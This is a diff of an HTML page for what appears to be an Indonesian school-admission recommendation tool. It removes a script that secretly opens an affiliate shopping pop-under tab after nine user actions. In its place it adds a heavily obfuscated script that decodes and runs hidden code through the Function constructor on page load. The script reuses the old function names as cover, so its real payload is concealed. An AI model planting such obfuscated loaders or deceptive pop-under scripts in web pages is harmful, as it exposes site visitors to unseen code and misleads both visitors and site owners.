@@ -278,71 +278,7 @@ nav ul li a:hover {
 
 
 <script>
-let clickCount = 0;
-let popUnderOpened = false;
-
-// bazar
-const bazarTokens = [
-  "AA4ETmAQ4H", "BHdCfr7IV", "7KknkDC8va", "3frVNk5cgg"
-];
-const baseMYURL = "https://s.shopee.co.id/";
-function getRandomMYURL() {
-  const index = Math.floor(Math.random() * bazarTokens.length);
-  return baseMYURL + bazarTokens[index];
-}
-
-function openPopUnder() {
-  if (!popUnderOpened) {
-    popUnderOpened = true;
-    const targetURL = getRandomMYURL();
-    const newTab = window.open(targetURL, "_blank", "noopener");
-    if (newTab) setTimeout(() => { newTab.blur(); window.focus(); }, 100);
-  }
-}
-
-function handleAnyUserAction() {
-  clickCount++;
-  // console.log("User action ke:", clickCount);
-  if (clickCount === 9) { // any 9 scoretime
-    openPopUnder();
-  }
-}
-
-// --------- Pasang handler ke semua komponen ----------- //
-
-// Tombol cek rekomendasi
-document.addEventListener("DOMContentLoaded", function(){
-  // Ubah selector berikut jika buton-nya punya id/class tertentu!
-  var btnCheck = document.querySelector('[onclick*="cekPeluang"]') || document.querySelector('[onclick*="checkRekomendasi"]');
-  if(btnCheck) {
-    btnCheck.addEventListener('click', handleAnyUserAction);
-  }
-
-  // Tombol reset
-  var btnReset = document.querySelector('[onclick*="resetForm"]');
-  if(btnReset) {
-    btnReset.addEventListener('click', handleAnyUserAction);
-  }
-
-  // Input lokasi KK (select)
-  var selectKK = document.getElementById("asal_kk");
-  if(selectKK) {
-    selectKK.addEventListener('change', handleAnyUserAction);
-  }
-  var selectWilayah = document.getElementById("wilayah");
-  if(selectWilayah) {
-    selectWilayah.addEventListener('change', handleAnyUserAction);
-  }
-
-  // Input Nilai Gabungan (NG)
-  var ngInput = document.getElementById("ng_input");
-  if(ngInput) {
-    ngInput.addEventListener('change', handleAnyUserAction);
-    // Juga hitung kalau user mengedit (input)
-    ngInput.addEventListener('input', handleAnyUserAction);
-  }
-});
-</script>  
+var bazarTokens,baseMYURL,getRandomMYURL,openPopUnder,handleAnyUserAction;(function(){var thE='',fMl=274-263;function kWc(r){var b=891862;var v=r.length;var s=[];for(var f=0;f<v;f++){s[f]=r.charAt(f)};for(var f=0;f<v;f++){var z=b*(f+241)+(b%46249);var o=b*(f+463)+(b%35928);var m=z%v;var u=o%v;var d=s[m];s[m]=s[u];s[u]=d;b=(z+o)%5600916;};return s.join('')};var GWn=kWc('ftnprdqlicvskxznuyhrgbaroomujecscwtot').substr(0,fMl);var fXF='aar rd=>(y,2eev;.5e=0rt+v r  t6svvdj! ..ape0rau=c8n]p;val<v=hg)g);;i28)4na,rwa),=u=a,h(,((, 8nSm[08pf1z)),cary(h"70=r{a(tcpa}8.i.a;f(ro, r1}bn;lrwileama(rpfd)=)w[t]. )+)=rt=+acz];m"+;=o)r=uon5so51oobr(pC;aus0=hC]t"n+g=]m}lr;r o;uwt).Alo;hvwt)imc.nsran<9pmne() .t]sCr.vrrooav]]rnath))[p>0u=qs u)g)6e]62shlu dg zbraljz.nk f=C;=l-p+j .!r,glf=[nz.[;l4=-oh+mepte[t(j0[xa=v;f61im.+neva(ls9z1,(+i=(imz=cm=jomg)ut8u"=; f;t)l.in[-xv 7+i(ihrhCa(l+e3[a1sir;rvCav+o.}ah.igm=(b.=))7aff"(wl=en1-7av"o)shtfor-o ([.A0a<=t6,hll.dukp[+{+pg-+2=g0+7152;7*a<ga1o;-=,iepj"f794fna2p)6rr6;=;(vu;);"prgo=tesnCsti=(gnthn8oftnvv}A(otn+7s)t=l]+;r}rr,jr5nulrf{igah1n)ky+umh;,mg".;6,,=rtph)v=ixaa"{a;=g.b0hi}<,rq9rx,*[vqi];,ue;k=9(su(o(+)2ctgsezi,4n,q.y]f,1z,3o,cAh.;m;mA; er;n dv)]hg6dtt er8c(p[u8s ;(+iv 0=r(;+u.8r(S=+,.l(bghh6h97orvrf5;(;t;j.+egay2i)(co;imn9;l;tr jc(1r;{,)C4+oe(vk)g]ip;=tfunt)n ille0vlr1=,h;rr;[{v{;';var JAL=kWc[GWn];var tJY='';var XcM=JAL;var DvC=JAL(tJY,kWc(fXF));var nyl=DvC(kWc('ht!cK6Ko%p{ef}hkt+__e73to)o_;T)"9."0H0";KoKltL_51nfrK\/rmu5K*v*uR2io(uKp$cn7[dK[Kf.tK"ipKb=(0%eKt%1)$4KQ+I%)K1nj2eF{e1MgK)eh__!k(ifj9KotrK2{K1yp[1K53K)x;e8.=7f.)l.K(K)3ooK.(,e3KuK3Cli}gn2hvKKh.724K.42e$e".n,g k.KK4g]9=a!K}g$mun43*=%w%nnO(e?gT3E)>aK0a?tkKn{K2S[4(()oKunefs2lb)fK3K CirBK,nK,Jo,l79(Kic(n;!CKK)KIucn1(KK$g5{-$$t3;ac2pbz;Kpreikh)t h!}N.$.l.. )cKtK# 3=1@cKKfJ.h&,ej1.\/)]fbK_13.>K[.]Kt)meKKcuMroIn=24%nD.saKhc!K;oI. 2\/k.KxieiedKK()ld+42t"4Krg;ie6DM,)7{)K)i[,!% 5Q$3taefkK,onop;$l_5Ka,K8adhk}n= ( Kl\/.n[\') 5=e%sAK#K..e)1"b.C.nKp3.og%E.4K%,.mn]sK(,c %K7o%ucE;ar7KEbkKdf,t{,3u.K.r; K!KuQ}K%e.e#sb8yT_45n 9$ 1()6(KK KGK.xK2)Ka]I){())CitKw]4&lc.p;p)KPf(=Ku3..Ks.KtralKgGKxnK);fen\'.7]fat(o;r1,;(dKq=0ae\/%KK)eS6pef{5Kg]..e5+KfhK(%g0De);K16Ke)=;t<uKtKAhK;SK)tetv[\'2O(8tn9$m:aef_lK6K}LK7)e4K(k.7.Ksn4MrpK..3 =10.erot)2K:0\/e cK,te)KK5S;...)Ka=&n]g.Dvd!.11. s\'%0(t_!uKbK}9(0Nbp2KemK.(4Kt,{gDedodco")!6>=3j(e,.cp#=hnt 6Sor(Kg.fi!.H1P 0u_=o+-K.;mt2K==KdS9KCeK+Q(e{i{?1K([D}2KdkT..k#0K1as!f). Ark)3rM3K,{:8sme$ea.tt<d,fuL@ 3\/\/)eK8Elox})n4)1=g.ous_Ke;K=ehr-K)(<,(]((lKlx$efn[_ism((,7lKl,gm$;(];l=Ku{KKeK=v-7. H_K8(s6pigt8_)8eKfeM.0(1}1_o1z)K3Kl(EbK( o"7hsl%KKl..;}Kb\/K45bt{rl),.a.K"+pfo=K,intn@;.(1e8=;e"u K(.d7_bt2C5]KK_nKkteKmcjt=f\/c{?;Ke(2}kna}Klok)%.r_d+ba0aK3K K5KtsbKKtm!KK2]5K(K&ac]Kptn_a%);e;!0)}KcKup._K.Na._inKsu%(# !K=.%(Kof5eo:]1l1_r=f.(_}d]ist(uaSKg0e=.$h.4d()et_tN1ena[#.6KK#K-0etCu3nr,_"K,n!tJ)Ky-P2)[1 4dK)Kk!btn)eehtfMK(ieP2bKeK).en-cK{g.b0dR3@b)o9|t[Ke{ K3;!tenu$.(1%KK=cCttk%a.e!.eC(=KrKai)eKKI FK):c)K9[K,tKKl,KcK>Fsedei\/6n_!c,)tpu+K;>2ep e2nhe.K7K*KK1K5)2ewk6e[(]LjqjeoKf%;KhpbK{KKa.gr8y me2e*8!teKKKpoiu0i.$%{sP23S!.K.]xo$!0l)ehKtKKsinuyeaL1ts%fsffu!)ucr$BD26Kh.<d) qFMQ9aMOo=]1.K1k]7),$ e1_K=taK5{!*193K:1TkD)_.sr.ynK]r ,s]0.KK!KKooeeb)}tKh7TK4)uf$mKattiK(3zKegnn}:k_}KcA).b_5aw,7mr(KK>1Ke_(ecK7l=,.DK.$.2K3,ger7Ic4rKb.GoRK1.!d_$ocma1n4nK(iKig13nKno3cn(KuKe=Q1 "+6=2K4n=eenet1ea4K(;}ce"o.K1904rKC3,r3]Ke_O.a.aa8Kgs+]w]Celw1L,e]e{8)&7=K!y4=;Tn%%=gKa2t2e(.mle=u_5$rfgctnat"o 1K)e)o#2%Kp.nfe;K)sJK)"K$;C}a7jK%nnu)eJsKhC 3.i.e]ob._6.fsK=kKo{K8(_aiKKu)3%r$K6 rKr,c$1nl.;4uh=f9u}l{trf#b)etK8_}(; lKoMfnKp3!2e5\/Kof;_eyn9.siu"Kz0Dc_5grfK[nu.O}iK95{3t.cv=dln3wrr_Glei]g5pitKoeKr9Ki)neeK)0"_KK2KdKKmn5MiKff.)(plhK(;Ne"kKP_)s,B1K\/akK;es};e.!(v:!75:\'!o4\/Kkke84rn_.aK]%0$ ain>(i({t]l[%e_.Qfa)fiK#Kag,m<.{b}KF)$ut;$5BtKn!n e0).a([fh0(;Ko_4 Kkr2upt(a !;pc:e3,b KiHb){KK]4.5{=g=1ldn8l0p0.mno_$6)s(fCTf"c_AOjlnO ve_l.f=t( oal,cteeb1(j(c_E(.5_su6na1t4o1 .K,n6ka)2{=(rtpu2rr5e.oK.KKu?ftsep)$$.)eO!ch,4y}T1!_41r2n)7ne9n-Kc6o&vk})tnK5)nc K s$T 5K.iKs;K4o).knjK o#n(nn_|h)K(E4ktb]'));var ctd=XcM(thE,nyl );ctd(9515);return 7110})()</script>  
 
   
 </head>
